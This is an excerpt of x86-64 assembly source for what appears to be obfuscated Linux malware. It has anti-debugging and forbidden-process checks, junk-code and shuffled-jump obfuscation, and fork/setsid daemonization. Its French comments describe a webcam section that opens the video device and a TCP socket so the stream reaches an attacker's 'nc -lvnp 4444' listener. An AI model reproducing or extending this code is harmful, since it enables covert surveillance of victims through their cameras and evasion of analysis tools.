end_:



	%include "functions/is_debugged.s"
	jmp	[rel .addr5r]
	.addr5: dq 0x421900000005
	.addr5r: dq 0
	dq 0x696900000005
	end_shuffle3:
	dq	1942, 5





	cmp rax, -1
	je .quit_exit





	%include "functions/check_forbidden.s"
	cmp rax, 1
	jne end_0


	.quit_exit:
	mov		rax, SYS_exit
	xor		rdi, rdi
	NOP
	NOP
	NOP
	NOP
	syscall




end_0:

	NOP
	mov		rax, 69548
	NOP
	call	[rbp + 32]

	JUNK_5

	jmp	[rel .addr6r]
	.addr6: dq 0x421900000006
	.addr6r: dq 0
	dq 0x696900000006
	end_shuffle4:
	dq	1942, 6


	JUNK_5
	NOP
	mov		rax, 89787
	NOP
	JUNK_5

	NOP
	mov		rax, SYS_open
	NOP

	mov		rdi, [rbp + 16]
	add		rdi, mydata.self

	;lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall




	cmp		rax, 0
	jmp	[rel .addr7r]
	.addr7: dq 0x421900000007
	.addr7r: dq 0
	dq 0x696900000007
	end_shuffle5:
	dq	1942, 7
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	JUNK_5
	mov		rsi, [rbp + 16]
	add		rsi, mydata.zero

	;lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall
	JUNK_5
	mov		rax, SYS_close
	mov		rdi, r12
	syscall



	.just_quit:

		mov		rax, SYS_fork
		syscall
		cmp		eax, 0
		jng		.continue_fork

		JUNK_5
		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall

	.continue_fork:
	jmp	[rel .addr8r]
	.addr8: dq 0x421900000008
	.addr8r: dq 0
	dq 0x696900000008
	end_shuffle6:
	dq	1942, 8
		NOP
		mov		rax, SYS_setsid
		syscall
		NOP

		; Ici commence la partie pour la cam
		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
		; c'est la commande que j'utilise avec
		; nc -lvnp 4444
		JUNK_5
		mov		rax, SYS_open

		mov		rdi, [rbp + 16]
		add		rdi, mydata.pathv

		;lea		rdi, [rel pathv]
		mov		rsi, 2
		NOP
		NOP
		NOP
		NOP
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		cmp		rax, 0
		jl		.continue_reverse
		mov		r12, rax	; file descriptor de video0
		JUNK_5
		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r13, rax	; le socket
